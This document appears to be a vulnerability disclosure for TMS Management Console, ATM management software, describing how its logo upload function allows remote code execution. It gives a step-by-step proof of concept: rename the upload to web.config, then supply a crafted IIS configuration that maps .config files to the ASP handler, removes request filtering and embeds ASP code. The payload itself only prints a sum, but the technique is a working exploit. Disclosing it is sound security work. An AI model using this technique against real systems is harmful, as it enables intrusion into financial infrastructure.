 # TMS Management Console 
*TMS Global Software - https://tmsglobalsoft.com gives you a cost effective and practical solution with best in class ATM management capabilities, not only improving your bottom line but also protecting the trust and convenience in your ATM network.*

 ### File Upload in Logo Upload Function via /Customer/AddEdit/{{Customer_id}} results in RCE. 
 ### Affected version: =< 6.3.7.27386.20250818 

## PoC

1. Intercept the Logo Upload Request
Capture the request to /Customer/AddEdit/{{Customer_id}} using a proxy (e.g., Burp Suite).

2. Modify the Request
In Logo upload request, modify the "filename" parameter from *.svg to web.config, also add a handler and asp code to web.config for code execution.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```
3. Execution
After the upload is successful, navigate to the uploaded file location: URL: http://<target>/icons/web.config

## Result
The page will render the result of the mathematical operation "3". This confirms that the asp.dll handler will process the content of any file with name *.config as asp code.
